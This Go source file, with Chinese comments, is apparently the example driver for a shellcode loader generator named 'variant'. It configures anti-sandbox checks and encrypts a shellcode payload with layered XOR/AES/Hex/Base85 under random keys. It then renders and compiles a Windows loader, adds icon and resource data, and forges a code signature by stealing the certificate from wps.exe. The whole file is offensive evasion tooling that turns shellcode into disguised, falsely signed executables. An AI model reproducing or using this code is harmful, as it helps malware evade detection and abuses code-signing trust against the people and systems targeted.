package main

import (
	"fmt"
	"strings"
	"variant/build"
	"variant/crypto"
	"variant/enc"
	"variant/log"
	"variant/rand"
	"variant/render"
)

func main() {
	// 反沙箱模块
	sandbox := render.SandBox{
		Methods: []string{
			"sandbox.BootTime",
			"sandbox.GetDesktopFiles",
		}}

	// 压缩算法模块
	//compressor := render.Compressor{
	//	Import:    "variant/compress",
	//	Algorithm: "compress.LzwDecompress",
	//	Ratio:     8,
	//}

	local := render.Local{
		KeyName:  rand.RStrings(),
		KeyValue: rand.LStrings(16),
		IvName:   rand.RStrings(),
		IvValue:  rand.LStrings(16),
	}

	// 设置加密参数
	params := enc.Payload{
		PlainText: "render/templates/payload.bin",
		FileName:  rand.RStrings(),
		Path:      "output",
		Key:       []byte(local.KeyValue),
		IV:        []byte(local.IvValue),
	}
	// 加密之后的 shellcode
	payload, err := params.SetKeyIV(crypto.XorAesHexBase85Encrypt) // 传入加密方法，根据加密方法的签名渲染模板
	if err != nil {
		log.Fatal(err)
	}

	args := render.Args{
		Import:  "os",
		ArgsKey: "kkk",
	}

	loader := render.Loader{
		Method: "loader.UuidFromString",
	}

	// 定义模板渲染数据
	data := render.Data{
		CipherText:    rand.RStrings(),
		PlainText:     rand.RStrings(),
		DecryptMethod: "crypto.XorAesHexBase85Decrypt",
		Local:         local,
		SandBox:       sandbox,
		Payload:       payload,
		Loader:        loader,
		Args:          args,
	}

	// 设置模板的渲染参数
	tOpts := render.TmplOpts{
		TmplFile:     "render/templates/v3/Base.tmpl",
		OutputDir:    "output",
		OutputGoName: fmt.Sprintf("%s.go", rand.RStrings()),
		Data:         data,
	}
	// 生成模板
	err = render.TmplRender(tOpts)
	if err != nil {
		log.Fatal(err)
	}

	// 编译参数
	cOpts := build.CompileOpts{
		GoFileName:  tOpts.OutputGoName,
		ExeFileName: fmt.Sprintf("%s.exe", strings.TrimSuffix(tOpts.OutputGoName, ".go")),
		HideConsole: false,
		CompilePath: "output",
	}

	// 编译
	if err = cOpts.Compile(); err != nil {
		log.Fatal(err)
	}

	// 添加图标和文件信息
	err = cOpts.Winres()
	if err != nil {
		log.Fatal(err)
	}

	// 伪造证书配置
	sOpts := build.SignOpts{
		SignPath: "output",
		UnSign:   cOpts.ExeFileName,
		Signed:   fmt.Sprintf("signed_%s", cOpts.ExeFileName),
		Cert:     "wps.der",
		Thief:    "wps.exe",
		DstCert:  "wps.der",
	}

	// 保存证书
	//err = sOpts.SaveCert()
	//if err != nil {
	//	log.Fatal(err)
	//}

	// 利用EXE进行签名伪造
	err = sOpts.ExeThief()
	if err != nil {
		log.Fatal(err)
	}

	// 利用证书进行签名伪造
	//err = sOpts.CertThief()
	//if err != nil {
	//	log.Fatal(err)
	//}

	// 压缩参数
	//upx := build.UpxOpts{
	//	Level:   "--lzma",
	//	Keep:    true,
	//	Force:   true,
	//	SrcExe:  sOpts.Signed,
	//	UpxPath: "output",
	//}

	// 执行压缩
	//err = upx.UpxPacker()
	//if err != nil {
	//	log.Fatal(err)
	//}

}
